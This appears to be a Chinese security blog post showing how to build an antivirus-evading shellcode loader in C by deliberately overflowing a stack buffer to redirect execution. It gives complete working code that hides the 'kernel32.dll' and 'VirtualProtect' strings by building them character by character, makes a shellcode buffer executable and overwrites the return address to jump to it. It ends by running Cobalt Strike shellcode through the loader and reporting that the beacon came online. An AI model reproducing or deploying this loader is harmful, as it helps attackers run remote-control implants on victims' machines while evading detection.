最近在看pwn和免杀，发觉可以使用栈溢出来加载shellcode，就做了一些尝试，使用栈溢出来编写加载器。

loader函数如下

> int loader(int size, char* str) {  
> char eee[10];  
> memcpy(eee, str, size);  
> return 0;  
> }

接下来做个测试，来判断哪个位置会覆盖到返回地址

测试代码如下

> #include<stdio.h>  
> #include<Windows.h>
>
> int loader(int size, char* str) {  
> char eee[10];  
> memcpy(eee, str, size);  
> return 0;  
> }
>
> int main() {  
> char* iii =
> "11111111222222223333333344444444555555556666666677777777888888889999999900000000aaaaaaaabbbbbbbb";  
> loader(200, iii);
>
> system("pause");  
> }

但是在测试之前，还需要对vs进行一些配置，禁用基本运行时检查和安全检查

![1691145113_64ccd3996803ee0e43464.png!small](https://image.3001.net/images/20230804/1691145113_64ccd3996803ee0e43464.png!small)

关闭优化

![1691145413_64ccd4c5a7e093513d090.png!small](https://image.3001.net/images/20230804/1691145413_64ccd4c5a7e093513d090.png!small)

编译后使用xdebug打开进行调试

![1691145519_64ccd52f0f0f8c392e5dd.png!small](https://image.3001.net/images/20230804/1691145519_64ccd52f0f0f8c392e5dd.png!small)

ret返回时，栈顶指针执行3636363636363636，0x36是6的ascii码，那么loader函数的返回地址位置就是66666666那里，只需要将66666666换成shellcode地址就可以进行加载了。

依据上面思路，不难写出下面加载代码

> #include<stdio.h>  
> #include<Windows.h>
>
> unsigned char buf[] = "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";
>
> int loader(int size, char* str) {  
> char eee[10];  
> memcpy(eee, str, size);  
> return 0;  
> }
>
> int main() {  
> size_t tmp = (size_t)buf;  
> char* tt = (char*)(&tmp);  
> printf("%p\n", buf);  
> char* iii = "1111111122222222333333334444444455555555";  
> char pp[200];  
> DWORD size= (strlen(iii));  
> int i;  
> for (i = 0; i < size; i++) {  
> pp[i] = iii[i];  
> }  
> pp[i] = *tt;pp[i + 1] = *(tt + 1);pp[i + 2] = *(tt + 2);pp[i + 3] = *(tt +
> 3);  
> pp[i + 4] = *(tt + 4);pp[i + 5] = *(tt + 5);pp[i + 6] = *(tt + 6);pp[i + 7]
> = *(tt + 7);
>
> char DllBuff[13];  
> DllBuff[0] = 'k';  
> DllBuff[1] = 'e';  
> DllBuff[2] = 'r';  
> DllBuff[3] = 'n';  
> DllBuff[4] = 'e';  
> DllBuff[5] = 'l';  
> DllBuff[6] = '3';  
> DllBuff[7] = '2';  
> DllBuff[8] = '.';  
> DllBuff[9] = 'd';  
> DllBuff[10] = 'l';  
> DllBuff[11] = 'l';  
> DllBuff[12] = '\x00';  
> char ViProBuff[15];  
> ViProBuff[0] = 'V';  
> ViProBuff[1] = 'i';  
> ViProBuff[2] = 'r';  
> ViProBuff[3] = 't';  
> ViProBuff[4] = 'u';  
> ViProBuff[5] = 'a';  
> ViProBuff[6] = 'l';  
> ViProBuff[7] = 'P';  
> ViProBuff[8] = 'r';  
> ViProBuff[9] = 'o';  
> ViProBuff[10] = 't';  
> ViProBuff[11] = 'e';  
> ViProBuff[12] = 'c';  
> ViProBuff[13] = 't';  
> ViProBuff[14] = '\x00';  
> HMODULE DllModule = LoadLibraryA(DllBuff);  
> FARPROC addr = GetProcAddress(DllModule, ViProBuff);  
> DWORD oldProtect = 0;  
> BOOL ret = addr((LPVOID)buf, sizeof buf, PAGE_EXECUTE_READWRITE,
> &oldProtect);
>
>  
> loader(200, pp);  
> system("pause");  
> }

下面使用cs生成shellcode进行加载

![1691147628_64ccdd6cd12e3b53e7aa1.png!small](https://image.3001.net/images/20230804/1691147628_64ccdd6cd12e3b53e7aa1.png!small)

成功上线

